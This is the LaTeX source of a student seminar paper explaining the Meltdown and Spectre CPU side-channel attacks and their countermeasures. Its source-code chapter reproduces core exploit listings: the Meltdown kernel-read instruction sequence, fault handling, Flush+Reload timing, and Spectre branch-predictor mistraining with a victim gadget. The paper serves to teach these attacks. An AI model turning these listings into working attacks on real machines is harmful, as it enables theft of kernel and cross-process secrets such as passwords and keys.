% TEMPLATE FOR SEMINARS
%
% This template serves as a basic style for your seminar paper. Please
% make yourself familiar with LaTeX, BibTeX and this template. Several
% parts of the template need to be adjusted, these places are marked
% with FIXME.
%
% Contact your advisor in case you have questions.

\documentclass[a4paper,oneside,openright] {scrreprt}
\usepackage[T1]{fontenc}
\usepackage[latin1]{inputenc}
\usepackage[pdftex]{graphicx,color}
\usepackage{graphicx}
\usepackage{epsfig}
\usepackage{fancyhdr}
\usepackage{times}
\usepackage{url}
\usepackage{amsmath}
\usepackage{amsfonts}
\usepackage{listings}
%\usepackage{dtklogos}
%\usepackage{blindtext}
\usepackage{tikz}
\usepackage[T1]{fontenc}
%\usepackage{longtable}
%\usepackage{supertabular}
\usepackage{verbatim}
\usepackage{color}
\usepackage{moreverb}       % z.B. \listinginput
\usepackage{float}

\definecolor{codegreen}{rgb}{0,0.6,0}
\definecolor{codegray}{rgb}{0.5,0.5,0.5}
\definecolor{codepurple}{rgb}{0.58,0,0.82}
\definecolor{backcolour}{rgb}{1.0,1.0,1.0}
 
\lstdefinestyle{mystyle}{
    backgroundcolor=\color{backcolour},   
    commentstyle=\color{codegreen},
    keywordstyle=\color{magenta},
    numberstyle=\tiny\color{codegray},
    stringstyle=\color{codepurple},
    basicstyle=\footnotesize,
    breakatwhitespace=false,         
    breaklines=true,                 
    captionpos=b,                    
    keepspaces=true,                 
    numbers=left,                    
    numbersep=5pt,                  
    showspaces=false,                
    showstringspaces=false,
    showtabs=false,                  
    tabsize=2,
    frame={shadowbox},
}
 
\lstset{style=mystyle}
 

\newcommand{\HRule}{\rule{\linewidth}{0.5mm}}

\title{\Huge Meltdown \& Spectre}
\author{\Large Marvin Schirrmacher}

\makeatletter

%*** Commands you may want to use ***
\newtheorem{theorem}{Theorem}[section]
\newtheorem{lemma}[theorem]{Lemma}
\newtheorem{proposition}[theorem]{Proposition}
\newtheorem{corollary}[theorem]{Corollary}
\newtheorem{definition}[theorem]{Definition}
\newtheorem{algorithm}[theorem]{Algorithm}
\newenvironment{example}{\begin{quote}{\bf Example:}}{\end{quote}}

\begin{document}

\input{titlepage}

\pagestyle{plain}
\cleardoublepage
\pagenumbering{roman}
\tableofcontents
\clearpage
\pagenumbering{arabic}

%************************************************************%
%* START WRITING HERE OR PROVIDE SECTIONS IN SEPERATE FILES *%
%************************************************************%

%%%
\chapter{Overview}  
\label{ch:overview}
%%%

Meltdown and Spectre are the result of the most critical vulnerabilities in todays processors 
which threaten the modern world of computing. They allow reading secret data from other processes running on
the same machine and thereby circumventing the protection mechanisms of operating systems.
These exploits put hardware and software companies under pressure for finding short-term as well
as long-term solutions to address arising problems. To avoid debacles quick solutions have been found 
for some of the uncovered exploit techniques, but in the long run the fundamental design of modern 
processors has to be challenged and reconsidered.

\section{Meltdown and Spectre in Brief}
\label{ch:intro:motivation}

Meltdown and Spectre misuse a feature of modern processors which enables fast execution of machine instructions, 
called \textit{out-of-order execution}. This feature allows to force the CPU to execute instructions 
which read secret data from address spaces of other processes or even the kernel address space. 
Even though the processors behave correctly by cleaning or vanishing illegally accessed data, 
they still leave traces which enable to build so called \textit{covert channels} 
and thus leveraging attacks likes Meltdown and Spectre.

\section{Relevance and Practical Impact}
\label{ch:intro:motivation}

Especially the rise of cloud computing accelerates the urgency for solving Meltdown and Spectre related issues.
Companies which run their software in the cloud became vulnerable because the exploit techniques enable attackers
to read private data of customers by running malicious software on the same machines. 

Also applications running on mobile phones or laptops are vulnerable and expose their sensitive data. 
Even browsers can easily be attacked with a short JavaScript implementation of Spectre and thus reveal secret data
like passwords, session keys or cookies from websites. These examples indicate that Meltdown and Spectre are a serious matter which should be dealt with.

This work introduces all basics needed to understand Meltdown and Spectre and also dives deeper into the implementation
to focus on technical details of the exploits. At the end the reader should have a deep understanding of Meltdown and Spectre
and should be able to distinguish their traits and impact on modern computing.

%%%
\chapter{Computer Architecture Basics}
\label{ch:basics}
%%%

This chapter introduces some basics which are needed to understand and create implementations of Meltdown and Spectre. 
All parts of this chapter are presented isolated and not in the context of the exploits. 
Rather their connection and purpose is highlighted in chapters 3 and 4.

\section{Processes, Address Spaces and Caching}
\label{ch:intro:motivation}

Operating systems use processes as an abstraction to handle execution of multiple programs at the same time
 and managing their associated resources like address spaces, registers, list of open files, 
 out-standing alarms and lists of related processes ~\cite{tanenbaum2009modern:39-41}. 
CPU hardware ensures that processes of the operating system, \textit{kernel processes},  and processes of users are protected from each other 
by generating isolated address spaces for each process 
and preventing mutual modification or illegal access of data ~\cite{silberschatz2012operating}.

Every illegal operation of a process trying to circumvent these isolation boundaries results in a 
fatal error, called \textit{trap}, which must be handled by the operating system. Memory separation is realized 
with the help of \textit{virtual address spaces} which are further divided into fixed-size \textit{pages} 
which are mapped into \textit{physical address space} by page tables ~\cite{hennessy2011computer:105-107}. 
A page table knows which process is allowed to access a specific page and thus it serves as
 a restriction mechanism to monitor and control illegal memory access.

The memory of a computer is divided into \textit{cache lines} which can be stored temporarily in the cache to accelerate
access of frequently used memory locations ~\cite{tanenbaum2009modern:24-27}. Because the size of a cache is limited
cache lines have to be evicted over time depending on their frequency of usage resulting in a \textit{cache hit} if a line
is cached, otherwise in a \textit{cache miss}. If a cache miss occurs the processor has to load data from another
cache or from memory which delays data access by a significant amount of time.

\section{Out-of-order Execution}
\label{ch:intro:motivation}

Tomasulo ~\cite{tomasulo1967efficient} created an algorithm which analyses a set or \textit{window} of
program instructions and their relationships to maximize their overlapping capabilities and thus the ability to get parallelized 
without harming essential precedences. This allows processors to reorganize instructions so that their execution is faster 
in comparison to the execution time with the original order.
Succeeding instructions can be executed in parallel if preceding ones
 have to wait for accessing memory in case of a cache miss~\cite{hennessy2011computer:183}.

\section{Branch Prediction}
\label{ch:intro:branch_prediction}

Branch prediction is a feature of processors used to guess the result of a conditional branch in a sequence of program instructions to gain performance boosts~\cite{smith1995microarchitecture}.
So called \textit{branch predictors} analyse static information, e.g. opcode types, or dynamic program information, e.g. the branch history, to predict the result of these conditional branches.
The prediction decides if the instructions following the branch condition should be executed or not.
If the guess is correct performance improvements are gained because following statements can be executed in advance 
while the condition is evaluated.

\section{Transient Instructions}
\label{ch:intro:branch_prediction}

As already mentioned above out-of-order execution reorders program instructions to accelerate CPU performance.
If an instruction is mistakenly executed in advance, e.g. when a branch condition is predicted incorrectly by the branch predictor, 
then the speculatively executed instruction is called a \textit{transient instruction} ~\cite{lipp2018meltdown, kocher2018spectre}.
When the CPU detects that a transient instruction was executed it inverts its effects by dismissing results and resetting the state of affected registers.
We will see in Chapter 3 that modern processors do not remove all traces of such transient instructions and thus enable
Meltdown and Spectre attacks.

This Chapter introduced some fundamentals which are needed for understanding Meltdown and Spectre as well as their 
effects on the architectural state of the CPU and the operating system. The next Chapter will show how these parts
are connected in the context of the exploits.

%%%
\chapter{Meltdown versus Spectre}
\label{ch:contentI}
%%%

The following chapter deals with the common features and differences of Meltdown and Spectre based on the
 original papers ~\cite{lipp2018meltdown, kocher2018spectre}. This chapter highlights why the exploits are related
 and shows how they use different techniques to achieve their goals.
 
 
 \section{Differences in Brief}
 \label{ch:intro:motivation}
 
 Meltdown and Spectre both misuse out-of-order execution and transient instructions as techniques to access memory of 
 other contexts by analyzing side channel information of the CPU's cache. 
  Meltdown enables an attacker to read memory of kernel and user processes
  in contrast to Spectre which just allows to dump memory of sandboxes or other user processes. Spectre affects all modern processors like Intel, AMD, and ARM while Meltdown
 is only exploitable on Intel processors. The challenge of Spectre is that it has to be adapted for specific programs under attack. 
 Meltdown on the other hand is a more general approach with regard to its implementation. The following sections compare Meltdown and Spectre in depth.
 
\section{What Unites Them?}
\label{ch:intro:motivation}

This section deals with the common features of Meltdown and Spectre in detail. 
Both attacks use out-of-order execution and transient instructions to manipulate the cache of a CPU and thereby
creating so called \textit{covert channels} to reveal secret data. Although they apply different techniques, 
as we will see in chapter 3.3, both attacks misuse the design of modern processors
by analyzing traces of \textit{microarchitectural state} changes. 

\subsection{Usage of Transient Instructions}
\label{ch:intro:motivation:A}

When a transient instruction is executed the microarchitectural state of a CPU is altered, e.g. registers are filled with results
of the instruction. When the CPU detects that the speculatively executed instruction should not have been executed it cleans these state
changes as already mentioned. So from the outer architectural view processors behave correctly. 
Despite modern processors do not eliminate all microarchitectural state changes properly so that the execution of a transient instruction
 leaves a persistent trace. In the case of Meltdown and Spectre the cache is altered with speculatively executed instructions resulting
 in a microarchitectural state change which is not vanished by modern CPUs.

 \subsection{Building Covert Channels}
\label{ch:intro:motivation:A}

Side-channel attacks use physical channels like power consumption or timing behavior of programs to
leak secret data. Meltdown and Spectre are side-channel attacks, more precisely \textit{cache attacks}, 
utilizing the timing behavior of the cache ~\cite{osvik2006cache}.

The core idea of the attacks is to execute transient instructions 
which access memory by interweaving the access location with an unknown secret byte from another protected context. 
When the CPU loads the secret byte to dynamically calculate the target access location 
it detects that the instruction is transient and vanishes the secret byte and the result of the final memory location from its state. 
Though the access instruction was executed in advance, before the CPU detects that it is transient, the microarchitectural state
 of the CPU is already altered.
 Since memory locations are cached when being read and the processor does not clean its microarchitectural state properly,
 we just have to detect which memory location has been cached to recreate the secret byte.
 Meltdown and Spectre instrumenting techniques like Flush+Reload ~\cite{yarom2014flush} 
 or Evict+Reload ~\cite{gruss2015cache} to find out the cached memory location depending on the secret byte.
These techniques load many locations from memory and measure how much time the access takes to detect cached lines.

Flush+Reload flushes the cache lines of the attacker's process with intrinsic CPU instructions and reloads a target memory location.
The reloaded and thereby cached location can be detected by measuring the access time which is significantly smaller than the access
time of flushed locations.
Evict+Reload works similarly to Flush+Reload but instead of flushing the cache it accesses many uncached memory
locations so that cached ones are evicted from the cache.
This technique is useful when the flush instruction is not available, e.g. for high level JavaScript implementations of Spectre. 

For both attacks the cache acts as a covert channel making the inner workings of the CPU visible to the outside world. 
The next section explains the details of revealing secret data with the mentioned techniques. 

\subsection{Process of Revealing Secret Data}
\label{ch:intro:motivation:A}

Meltdown and Spectre exploit the execution of transient instructions by accessing bytes of memory contexts 
 which are usually protected by the CPU, the operating system or sandboxes. 

For revealing a secret byte two registers, R1 and R2, must be under control of the attacker. The contents of these registers have to be 
combined with a reversible operation like add, subtract or XOR. Besides an array, the so called \textit{probe array}, has to be 
initialized in the attacker's address space with the size of 256, i.e. byte size, times the size of a memory page. This array will 
reveal secret bytes as explained below.

The transient instructions of Meltdown and Spectre consist of the following steps:
The attacker loads the base address of the probe array into R1 and combines it with a secret byte loaded into R2. 
Then the element of the probe array at the resulting address, e.g. R1+R2, has to be accessed by the malicious instruction sequence.
Thus the secret byte in R2 can be seen as the offset location which points to one of the 256 elements of the probe array.

The next step after executing the transient instruction is to find the element of the probe array which has been cached by the processor
because this must be the accessed element.
A cached element is loaded significantly faster into a register of the CPU than accessed from memory.
If every element of the probe array is checked for being cached by utilizing techniques like Flush+Reload or Evict+Reload it is possible
to reveal the secret byte because it matches the position of the cached element.
This process can be executed iteratively to reveal many secret bytes from protected contexts. Its important to mention that this exploit
applied by Meltdown and Spectre can also be realized with high level languages like JavaScript.

This chapter highlighted the common techniques of Meltdown and Spectre and how they can be used to access protected memory.
The next chapter will focus on the differences of the exploits.

\section{What Divides Them?}
\label{ch:intro:motivation}

This chapter deals with the differences of Meltdown and Spectre. As mentioned above Meltdown enables an attacker 
to dump the memory of kernel and user processes. On the other hand Spectre can just be utilized to read protected memory within 
the same process (sandboxes) or of other user processes.
Adding to this the implementation of Spectre is more specific because it requires adaptation to the attacked process,
 e.g. by analyzing the binaries a program uses. Meltdown is a more general approach with the limitation that it just works on Intel
 processors in contrast to Spectre which is applicable on all modern processors like Intel, AMD, and ARM. Furthermore Meltdown and 
 Spectre use different implementation details regarding the usage of transient instructions. 
 All these details will be examined in the following.

\subsection{Dealing with Exceptions}
\label{ch:intro:motivation:A}

As explained above Meltdown and Spectre try to manipulate the cache with the help of transient instructions. 
When a CPU detects illegal memory access within such instructions a fatal error is raised and the program of the attacker
is terminated. Therefore Meltdown has two concepts of avoiding crashes: \textit{exception handling} and \textit{exception suppression}.

Exception handling is the process of catching raised errors. Meltdown uses signal handlers to catch errors
which are executed in case of a segmentation fault.

Exception suppression is the process of preventing that an error is raised. This can be done by putting the illegal memory access
within a branch condition. The goal is to trick the branch predictor so that the condition is predicted incorrectly and the following
instructions are speculatively executed.
Then errors do not terminate the attacker's process instead the CPU silently vanishes their results
 but still leaves exploitable traces in the cache.
Meltdown misuses the race condition of the CPU between raising the error and cleaning it's microarchitectural state. On Intel TSX processors Meltdown realizes exception suppression by grouping transient instructions which can be
 reversed as a whole after failing.

The Spectre attack does not need to catch segmentation faults because it just tricks the branch predictor to access secret data. 
Hence the exploit is only based on exception suppression.

\subsection{Complexity and Impact}
\label{ch:intro:motivation:A}

Since Meltdown circumvents the raise of segmentation faults it enables the attacker to read secret bytes even from the kernel address space.
Thus Meltdown breaks the isolation of the malicious program and achieves privilege escalation. 
On the other hand Spectre just tries to read legal memory locations. Hence it does not achieve privilege escalation and just can read
protected memory from the same process. 
Despite it can reveal memory of other user processes because the branch predictor can be manipulated in the 
context of the attacker program and at the same time affecting the branch prediction within other contexts, i.e other processes.
So the attacker has to search for \textit{gadgets} within the binaries of the victim program which access data the attacker wants to reveal.
These gadgets should follow a branch condition so that the exploit is applicable.
If the branch predictor is tricked the victim's process will execute the instructions of the gadget which then influence the cache 
and enable the above-mentioned techniques. 
This shows that Spectre is more complex than Meltdown if memory of other processes should be dumped. 
If the attacker wants to read memory of the same process Spectre is as simple as Meltdown because the binaries of the victim program
can be neglected.

The most important difference between Meltdown and Spectre is that the former is only applicable on Intel processors while Spectre 
also affects AMD and ARM processors. The reason for that is not known by the researchers but it might be possible that current 
implementations of Meltdown are not perfectly optimized.

This chapter highlighted the differences between Meltdown and Spectre to get a deeper understanding of the exploits.
Now the foundation for the next chapter is given so that implementations of the attacks can be presented.

%%%
\chapter{Source Code Analysis}
\label{ch:sourceCodeAnalysis}
%%%

This chapter shows example implementations of Meltdown and Spectre created by the researchers of the original papers.
The implementations will highlight how the exploits work in detail.

\section{Meltdown Implementation}
\label{ch:intro:motivation}

This section deals with the implementation of Meltdown\footnote{https://github.com/IAIK/meltdown/tree/master/libkdump} applying
Flush+Reload to build a covert channel. The focus of the following is just on the core functionality of the implementation.

\subsection{Transient Instruction Sequence}
\label{ch:TransientInstructionSequence}

Listing ~\ref{lst:meltdown} shows the x86 assembly implementation of the transient instruction sequence
which enables the Meltdown exploit.
Like explained above the probe array has to be initialized with 256 page sized elements.
\texttt{RBX} contains the base address of the probe array.
Line 4 tries to access a protected memory location from the kernel space and loads the result into \texttt{RAX}. 
This action will raise an error which will be handled by techniques mentioned in the following.
When the error is raised the microarchitectural state of the CPU, i.e. the cache, is already altered 
by the instruction from line 7 which is executed out of order to access an element of the probe array.

\begin{lstlisting}[language={[x86masm]Assembler}, caption=Meltdown: Transient Instruction Sequence, label={lst:meltdown}]
; rcx = kernel address
; rbx = probe array
retry:
mov al, byte [rcx]
shl rax, 0xc
jz retry
mov rbx, qword [rbx + rax]
\end{lstlisting}

The access location is computed by adding the base address of the probe array to the content of \texttt{RAX} which 
is the secret byte multiplied by the size of a memory page in line 5.
This is necessary to ensure that the distance of the accessed elements is large enough and to avoid caching of adjacent memory locations.
After execution of line 7 techniques like Flush+Reload or Evict+Reload can be applied to reveal the secret byte from kernel memory.


\subsection{Dealing with Exceptions}
\label{ch:intro:motivation:A}

Meltdown uses exception handling and exception suppression to avoid crashes of the attacker program when accessing protected memory.
Listing ~\ref{lst:signalhandler} shows an example implementation of an exception handler.
Signal handlers allow a program to react to certain execution events. 
\texttt{SIGSEGV} is the event which should be handled in the case of Meltdown because invalid memory locations are accessed.
Line 3 in this example unblocks the \texttt{SIGSEGV} event and thus prevents crashes when a segmentation fault is detected.

\begin{lstlisting}[language=C, caption=Meltdown: Exception Handling 1, label={lst:signalhandler}]
static void segfault_handler(int signum) {
  (void)signum;
  unblock_signal(SIGSEGV);
  longjmp(buf, 1);
}
\end{lstlisting}

The implementation of \texttt{unblock\_signal} is presented in listing ~\ref{lst:unblocksignal}. 
Here a signal set is initialized where the \texttt{SIGSEGV} event is added to.
Afterwards the signal mask of the process is changed by removing \texttt{SIGSEGV} events with \texttt{sigprocmask}.
This has the consequence that the process is not blocked by segmentation faults, hence raised errors are handled.

\begin{lstlisting}[language=C, caption=Meltdown: Exception Handling 2, label={lst:unblocksignal}]
static void unblock_signal(int signum __attribute__((__unused__))) {
  sigset_t sigs;
  sigemptyset(&sigs);
  sigaddset(&sigs, signum);
  sigprocmask(SIG_UNBLOCK, &sigs, NULL);
}
\end{lstlisting}

An alternative to exception handling is exception suppression which is realized by reverting grouped instructions.
This technique is just implemented for Intel TSX processors and can be seen in listing ~\ref{lst:tsx}.
\texttt{xbegin()} starts a transaction, i.e. a set of instructions.
\texttt{\_XBEGIN\_STARTED} indicates that a transaction started successfully.
Line 2 contains the actual Meltdown exploit which is highlighted in chapter ~\ref{ch:TransientInstructionSequence}.
\texttt{xend()} commits the current transaction so that it gets executed.
When a segmentation fault is thrown by the CPU the transaction is just rolled back and does not terminate the attacker's process,
hence raised errors are suppressed.

\begin{lstlisting}[language=C, caption=Meltdown: Exception Suppression on Intel TSX, label={lst:tsx}]
if (xbegin() == _XBEGIN_STARTED) {
  MELTDOWN;
  xend();
}
\end{lstlisting}

\subsection{Building a Covert Channel}
\label{ch:intro:motivation:A}

Listing ~\ref{lst:flushAndReload} contains the Flush+Reload implementation of Meltdown. 
The reload instruction of the pointer \texttt{ptr} in line 5 is wrapped 
by time measurements utilizing the intrinsic instruction for reading the time-stamp counter of the CPU ~\cite{intelintrinsics}. 
Depending on the measured time the value is assumed to be cached if it is smaller
than the \texttt{cache\_miss\_threshold} which has to be calculated in advance.
In line 8 \texttt{ptr} is flushed with an underlying intrinsic instruction called \texttt{clflush} ~\cite{intelintrinsics}
so that it no longer resides in the cache.

\begin{lstlisting}[language=C, caption=Meltdown: Flush+Reload, label={lst:flushAndReload}]
static int __attribute__((always_inline)) flush_reload(void *ptr) {
    uint64_t start = 0, end = 0;
  
    start = rdtsc();
    maccess(ptr);
    end = rdtsc();
  
    flush(ptr);
  
    if (end - start < config.cache_miss_threshold) {
      return 1;
    }
    return 0;
}
\end{lstlisting}

Listing ~\ref{lst:computeThreshold} illustrates how the cache threshold can be determined.
The implementation applies one million iterations to compute a precise threshold value.
Therefore a pointer \texttt{ptr} is accessed in line 6 so that it's referenced data gets cached. 

\begin{lstlisting}[language=C, caption=Meltdown: Cache Miss Threshold 1, label={lst:computeThreshold}]
size_t reload_time = 0, flush_reload_time = 0, i, count = 1000000;
size_t dummy[16];
size_t *ptr = dummy + 8;
uint64_t start = 0, end = 0;
  
maccess(ptr);
for (i = 0; i < count; i++) {
  start = rdtsc();
  maccess(ptr);
  end = rdtsc();
  reload_time += (end - start);
}
for (i = 0; i < count; i++) {
  start = rdtsc();
  maccess(ptr);
  end = rdtsc();
  flush(ptr);
  flush_reload_time += (end - start);
}
reload_time /= count;
flush_reload_time /= count;
\end{lstlisting}

Afterwards the access time is measured to detect how long it takes to retrieve the cached value. 
Then the pointer's referenced data is removed from the cache in line 17 and thus reloaded from memory in every iteration.
At the end the average access time for cache hits and cache misses are computed.
Listing ~\ref{lst:computeThreshold} shows the final computation of \texttt{cache\_miss\_threshold}.

\begin{lstlisting}[language=C, caption=Meltdown: Cache Miss Threshold 2, label={lst:finalthreshold}]
config.cache_miss_threshold = (flush_reload_time + reload_time * 2) / 3;
\end{lstlisting}

\subsection{Reading Secret Bytes}
\label{ch:intro:motivation:A}

This section shows how all parts mentioned above are connected to read secret bytes.
In listing ~\ref{lst:readsecretbytes} a working Meltdown implementation is shown which utilizes
signal handlers. The implementation for Intel TSX processors is equivalent.
Just line 6 is specific to the signal handler technique where \texttt{setjmp} is used to save the program's execution state.
When a segmentation faults occurs \texttt{longjmp} in listing ~\ref{lst:signalhandler} is called to reestablish the program's state
without restoring the signal mask.

Line 7 contains the Meltdown core instructions shown in listing ~\ref{lst:meltdown}.
After their execution Flush+Reload is applied to the variable \texttt{mem} which contains the data
from a specific location of the probe array. As already explained the access location is interweaved with a
secret byte so that the index of the cached element has to be found to reveal it.


\begin{lstlisting}[language=C, caption=Meltdown: Reading Secret Bytes, label={lst:readsecretbytes}]
int __attribute__((optimize("-Os"), noinline)) libkdump_read_signal_handler() {
    size_t retries = config.retries + 1;
    uint64_t start = 0, end = 0;
  
    while (retries--) {
      if (!setjmp(buf)) {
        MELTDOWN;
      }
  
      int i;
      for (i = 0; i < 256; i++) {
        if (flush_reload(mem + i * 4096)) {
          if (i >= 1) {
            return i;
          }
        }
        sched_yield();
      }
      sched_yield();
    }
    return 0;
}
\end{lstlisting}

So we iterate over all possible probe array indices to find a cache hit with Flush+Reload in line 12.
Here \texttt{4096} indicates the memory page size which is multiplied by the index \texttt{i} to access the next element
of the probe array which contains 256 times 4096 bytes. The access of page sized elements prevents that adjacent elements are loaded
and cached simultaneously. This would lead to invalid measurement results.

In line 17 and 19 \texttt{sched\_yield} is called so that the Meltdown attack is executed by the next thread if more
than one was configured. Increasing the number of threads should improve the chance of reading protected memory.


\section{Spectre Implementation}
\label{ch:intro:motivation}

This chapter examines an example C++ implementation of Spectre which also applies Flush+Reload and some advanced techniques
to manipulate the branch predictor.

\subsection{Building a Covert Channel}
\label{ch:intro:motivation:A}
 
This section illustrates how Spectre creates a covert channel with Flush+Reload. 
In listing ~\ref{lst:victim} the flush part of the Flush+Reload attack is shown. It utilizes the intrinsic instruction 
\texttt{\_mm\_clflush} ~\cite{intelintrinsics} to clean the probe array \texttt{array2} from the cache. This part resets the cache state
so that time measurements can be conducted afterwards. If Spectre is implemented in high level languages like JavaScript it
might be the case that \texttt{\_mm\_clflush} is not available as a function call. Then other techniques like Evict+Reload have
to be applied.

\begin{lstlisting}[language=C, caption=Spectre: Flush, label={lst:flush}]
for (i = 0; i < 256; i++)
    _mm_clflush(&array2[i * 512]); /* clflush */
}
\end{lstlisting}

The next step is the reload phase where all elements of the probe array are tested for being cached. 
Listing ~\ref{lst:reload} contains the instructions of this phase. Line 3 maps the index value \texttt{i} to pseudorandom numbers
 so that the access of the elements is scattered and not conducted linearly. 
 This is necessary because neighboring pages might be cached if 
accessed linearly which would lead to invalid measurement results. Line 6 contains the actual reload instruction which is wrapped 
by time measurements.
To measure the access time precisely the intrinsic instruction \texttt{\_\_rdtscp} ~\cite{intelintrinsics} is used which
copies the CPU's time-stamp counter. High precision timers are crucial for the attack. For this reason browsers like 
Google Chrome reduced the precision of the \texttt{performance.now()} function to mitigate Spectre attacks ~\cite{chromeSpectreMeltdown}.
To distinguish a cached memory location from an uncached one it is necessary to compute the value \texttt{CACHE\_HIT\_THRESHOLD}.
This value has to be adapted for the CPU and can be calculated by taking the average time of many cache hits.
If the measured access time is smaller or equal to the threshold the index of the related element is considered as a potential result.

\begin{lstlisting}[language=C, caption=Spectre: Reload, label={lst:reload}]
for (i = 0; i < 256; i++)
{
    mix_i = ((i * 167) + 13) & 255;
    addr = &array2[mix_i * 512];
    time1 = __rdtscp(&junk);
    junk = *addr;
    time2 = __rdtscp(&junk) - time1;
    if (time2 <= CACHE_HIT_THRESHOLD &&
        mix_i != array1[tries % array1_size])
        results[mix_i]++; /* cache hit -> score +1 for this value */
}
\end{lstlisting}

\subsection{Tricking the Branch Predictor}
\label{ch:intro:motivation:A}

Tricking the branch predictor is the core of the Spectre attack. Listing ~\ref{lst:twiddling} contains instructions which
 set the value of a variable \texttt{x} within a for-loop to confuse the branch predictor.
The variable \texttt{x} represents the access location of an array which is the starting point for malicious memory access.
The idea is to fill \texttt{x} over many iterations with valid locations so that the branch predictor believes
that it's value is within the array bounds. But in some of the iterations \texttt{x} is set to an invalid memory location
which is out of the array bounds where the secret bytes should be read.

\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking, label={lst:twiddling}]
x = ((j % 6) - 1) & ~0xFFFF;
/* Set x=-1 if j&6=0, else x=0 */
x = (x | (x >> 16));
x = training_x ^ (x & (malicious_x ^ training_x));
    
/* Call the victim! */
victim_function(x);
\end{lstlisting}

Although the instruction sequence seems complicated it just sets the value \texttt{x} to the malicious target location 
\texttt{malicious\_x} in every 6th iteration. In every other iteration \texttt{x} is set to \texttt{training\_x}.
Listing ~\ref{lst:simplified} shows the semantic equivalent which is not applicable for the attack because the compiled code
contains jump instructions which give the branch predictor hints that \texttt{malicious\_x} and also \texttt{x} are invalid.
The source code of listing ~\ref{lst:twiddling} is optimized so that the compiled instructions contain no jumps.

\begin{lstlisting}[language=C, caption=Spectre: Branch Predictor Tricking Simplified, label={lst:simplified}]
x = (j % 6 == 0) ? malicious_x : training_x;
\end{lstlisting}

Listing ~\ref{lst:victim} shows an example victim function. The goal is to trick the branch predictor so that the if condition is 
assumed to be true even if the value \texttt{x} is out of the array bounds. The value \texttt{512} indicates the memory page size of the
attacked program which is multiplied by the secret value accessed through \texttt{array1}. So an element of \texttt{array2}, the probe array, is loaded
and thus cached if the instruction in line 5 is executed. Then Flush+Reload has to be applied to identify the cached element
and the secret byte at memory location \texttt{x}.

\begin{lstlisting}[language=C, caption=Spectre: Example Victim Gadget, label={lst:victim}]
void victim_function(size_t x)
{
    if (x < array1_size)
    {
        temp &= array2[array1[x] * 512];
    }
}
\end{lstlisting}

It is also important that the variable \texttt{array1\_size} of listing ~\ref{lst:victim} is flushed from the cache so that out-of-order
execution is triggered when the value has to be loaded from memory due to a cache miss so that the transient instruction within
the branch condition can be executed in advance.

To achieve good measurements with Flush+Reload the Spectre implementation uses 1000 iterations to be sure that the results
are significant. Within these iterations the branch predictor is trained with another 30 iterations leading to a low error rate (<0.01\%)
of reading secret bytes from protected contexts.

%%%
\chapter{Countermeasures}
\label{ch:countermeasures}
%%%

This chapter deals with a short overview of countermeasures mitigating Meltdown and Spectre. 
Although the fundamental design of modern processors enables the exploits there are still techniques to impede
the attacks.

\section{Meltdown}
\label{ch:intro:motivation}

Because the Meltdown exploit is based on fundamental CPU design issues it requires radical changes regarding instruction execution.
One option to prevent Meltdown is to disable out-of-order execution which would result in a massive slow-down of CPU performance.
Another way is to prevent the race condition between errors and illegal memory fetches. This is possible by serializing instructions
which check the access permission and those accessing memory.
A third option is to separate the user address space and the kernel address space so that illegal memory access is immediately
identified by hardware without table lookups, e.g. with the help of the virtual address.
The latter option is regarded as the most adequate because it could be realized with acceptable performance losses.
Meltdown is a hardware based exploit so that software patches do not solve all related problems. 
Still there is one software patch which impedes the exploit called \textit{KAISER} ~\cite{gruss2017kaslr}.

\subsection{KAISER}
\label{ch:intro:motivation}

Meltdown allows to read protected memory from kernel address space because it is mapped in the user address space.
KAISER is a software patch which separates kernel from user address space and introduces a so called \textit{shadow address space}
to isolate kernel memory. 
The shadow address space just contains the user address space and thus is completely isolated from the kernel address space.
Adding to this a process has a second address space where the kernel address space is still mapped into 
but it is reduced to the required minimum so that the attack surface is much smaller. 
Here the user address space is protected by supervisor-mode access prevention (SMAP) 
and supervisor-mode execution prevention (SMEP).

\section{Spectre}
\label{ch:intro:motivation}

The problems emerging due to the design issues of modern processors make it difficult to prevent Meltdown and Spectre 
as well without performance degradations.
One option to mitigate Spectre is to disable speculative execution. 
Modern processors do not support modes for disabling speculative execution. 
Moreover the performance of processors would be affected severely.
A second option is to prevent that secret data can be accessed by speculatively executed instructions. 
This can be done by protecting access to pointers with the help of type checks 
so that the access through a pointer to another type is prevented.
Another option is to identify memory which is accessed by speculative instructions and to prevent that subsequent
instructions can reveal it.
Besides cache attacks like Flush+Reload can be impeded by reducing the precision of time-stamp counters as already mentioned.
The last option is to mitigate indirect branch poisoning which enables manipulation of the branch predictor in other contexts.
This can be done by software patches like \textit{retpolines} ~\cite{retpoline}.
%%%
\chapter{Conclusion}
\label{ch:conclusion}
%%%

This work presented Meltdown and Spectre with a detailed comparison and example implementations to give 
an overview of the attacks and their implications. 
The exploits demonstrate how the leakage of small traces within a processor lead to powerful side-channel attacks
which threaten the modern world of computing. 
Meltdown and Spectre introduce a new chapter in the world of side-channel attacks affecting mobile phones, laptops, browsers and 
many other areas like cloud computing.
Both attacks highlight the urgency for overthinking current processor designs and demonstrate that there is a tradeoff between
fast and secure processors.
Even though there are software solutions like KAISER to impede some issues, hardware solutions are inevitable for long-term 
security of computing.

\lstlistoflistings

\bibliography{literature}
\bibliographystyle{alpha}

\end{document}
